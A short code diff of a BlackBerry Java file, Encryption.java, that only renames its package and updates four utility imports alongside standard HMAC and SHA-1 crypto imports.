@@ -5,7 +5,7 @@
  * File         : Encryption.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.crypto;
+package blackberry.crypto;
 
 import net.rim.device.api.crypto.CryptoTokenException;
 import net.rim.device.api.crypto.HMAC;
@@ -14,10 +14,10 @@ import net.rim.device.api.crypto.MACOutputStream;
 import net.rim.device.api.crypto.SHA1Digest;
 import net.rim.device.api.util.Arrays;
 
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 public class Encryption {
 
